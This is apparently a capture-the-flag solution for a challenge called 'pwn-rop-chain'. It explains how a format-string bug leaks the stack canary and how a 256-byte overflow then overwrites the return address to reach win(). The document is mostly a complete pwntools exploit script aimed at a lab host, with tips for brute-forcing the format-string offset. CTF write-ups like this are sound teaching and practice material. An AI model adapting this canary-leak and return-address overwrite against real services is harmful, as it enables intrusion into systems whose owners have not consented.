# pwn-rop-chain — Solution

## Binary Properties
- **No PIE** (fixed addresses) — `-no-pie`
- **Stack canary** — `-fstack-protector-all`
- **NX** — no executable stack
- **Full RELRO**

## Vulnerabilities
1. `printf(buf)` — format string: leak stack canary and any stack addresses
2. `read(STDIN_FILENO, large, 512)` into 256-byte buffer — 256-byte overflow

## Exploitation Steps

### Step 1 — Win function address
Binary prints `win()` address at startup. Since no PIE, we know all binary addresses statically.

### Step 2 — Leak canary via format string
Send `%p.%p.%p...` (up to ~20 positions) to `Username:` prompt.
The stack canary appears at a fixed offset (typically `%17$p` or similar — find it by looking for a value ending in `\x00`).

### Step 3 — ROP chain overflow
Stack layout for `authenticate()`:
```
[buf 64 bytes][large 256 bytes][canary 8][saved rbp 8][ret addr 8]
```
Overflow `large` (256 bytes) → write past it → canary → rbp → ret.

ROP chain to call `win()` directly (or use `system("/bin/sh")`):
```
padding (264 bytes) + canary + rbp_junk + p64(win_addr)
```

## Exploit

```python
from pwn import *

HOST = '172.30.1.31'
PORT = 9998

elf  = ELF('./vuln', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def start(): return remote(HOST, PORT)

p = start()

# Step 1: get win() address (no PIE so it's fixed, but binary prints it anyway)
p.recvuntil(b'server at: ')
win_addr = int(p.recvline().strip(), 16)
log.success(f'win: {win_addr:#x}')

# Step 2: format string leak — find canary
# Send multiple %p to leak stack values
p.sendafter(b'Username: ', b'%15$p.%17$p.%19$p\n')
line = p.recvline()
vals = line.strip().split(b'.')

# Canary ends in \x00 — identify it from the leaked values
canary = None
for v in vals:
    try:
        val = int(v, 16)
        if val & 0xff == 0 and val > 0x100000000:
            canary = val
            log.success(f'canary candidate: {canary:#x}')
            break
    except:
        pass

if canary is None:
    # Brute force offset: send individual %Nd$p for N in range
    log.warning('Canary not found, adjust offset')
    canary = 0xdeadbeefcafe0000  # placeholder

# Step 3: overflow with ROP
# Stack: [buf=64][large=256][canary=8][rbp=8][rip=8]
# We write into large[], which starts 64 bytes into the frame
# From start of large[]: 256 bytes to reach canary
padding = b'A' * 256
payload  = padding
payload += p64(canary)
payload += p64(0x4141414141414141)  # saved rbp (junk)
payload += p64(win_addr)            # overwrite ret addr with win()

p.sendafter(b'Password: ', payload)
p.interactive()
```

## Notes
- Adjust format string offset (`%15$p` etc.) by testing locally: run binary, send `%1$p.%2$p...%25$p`, identify canary (ends in `\x00`)
- `win()` calls `system("cat /home/ctf/flag.txt")` — no shell needed
- If canary offset differs, use: `for i in range(1,30): send('%{}$p'.format(i))` and grep for `\x00` suffix
